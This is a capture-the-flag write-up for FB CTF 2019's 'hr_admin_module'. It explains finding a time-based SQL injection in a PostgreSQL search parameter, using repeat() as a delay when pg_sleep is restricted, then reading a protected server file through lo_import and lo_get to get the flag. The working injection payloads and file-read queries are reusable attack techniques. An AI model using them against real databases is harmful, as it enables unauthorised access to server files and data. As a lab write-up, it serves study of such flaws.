# hr_admin_module

This challenge tells us that there are some secrets in the `/var/lib/postgresql/data/secret`, but the current user doesn't have sufficient permissions to access it.

(This path tells us that backend DBMS is `postgresql`.)

There is a weird disabled function `Search users`, but we can still send the request with the parameter `user_search`.

If my input is invalid SQL statement, it will show the warning message on the next request.

e.g. 

- warning: `admin'`, `'''`, `'kaibro_30_cm`, ...
- no warning: `admin'--`, `''`, `'||'kaibro_30_cm`, ...

This is an obvious SQL Injection vulnerability.

![](https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/sqlinj.png)

And this chellenge seems like to restrict the permissions of some functions, e.g. `pg_sleep()`, `pg_read_file()`, ...

But I found that `repeat()` function will cause time delay!

e.g. `'and 1=2 union select NULL, (select case when 1=1 then (select repeat('a', 10000000)) else NULL end)--`

Now, we have Time-based SQL Injection!

My injection script is [here](https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py).

Let's dump some basic information:

```
version: (Debian 11.2-1.pgdg90+1)
current_db: docker_db
current_schema: public
table of public: searches
columns of searches: id,search
current_query: SELECT * FROM searches WHERE search = 'YOUR_INPUT'
```

Nothing special :(

The table `searches` seems empty and we don't have permissions to use any system administration functions like `pg_read_file()`, `pg_ls_dir()` or `pg_stat_file()`.

But the path of secret looks like postgresql default data directory.

This means we should read file by some special file functions.

So I guess there are some special functions with wrong permissions that can be used to read the secret file.

I browsed the postgres documentation and postgres src the whole day, but nothing special.

At last, I build a local postgresql environment and try to find all functions that contain the `file` in the function name:

`SELECT proname FROM pg_proc WHERE proname like '%file%';`

=>

```
 pg_stat_get_db_temp_files
 pg_walfile_name_offset
 pg_walfile_name
 pg_rotate_logfile_old
 pg_read_file_old
 pg_read_file
 pg_read_binary_file
 pg_stat_file
 pg_relation_filenode
 pg_filenode_relation
 pg_relation_filepath
 pg_show_all_file_settings
 pg_hba_file_rules
 pg_rotate_logfile
 pg_current_logfile
```

But these functions are all useless.

After that, I tried to find all functions with `read` in the function name:

`SELECT proname FROM pg_proc WHERE proname like '%read%';`

=>

```
 loread
 pg_stat_get_db_blk_read_time
 pg_read_file_old
 pg_read_file
 pg_read_binary_file
```

The first function looks so weird.

Then I found a series of this function: `lo_import`, `lo_open`, `lo_read`, ... in the [documentation](https://www.postgresql.org/docs/11/lo-funcs.html).

The `lo_import()` can load file into postgres object.

Let's try it: `lo_import('/var/lib/postgresql/data/secret')`.

=> return a number `18440`.

This number is the object id, and this means that secret file load into object successfully!

Now, we can use `lo_get(oid)` function to read the object content by the corresponding oid.

```
select cast(lo_import('/var/lib/postgresql/data/secret') as text)
=> 18440

select cast(lo_get(18440) as text)
=> \x66627b4040646e....
```


flag: `fb{@@dns_3xfil_f0r_the_w1n!!@@}`

(it looks like this is unintended solution :p)

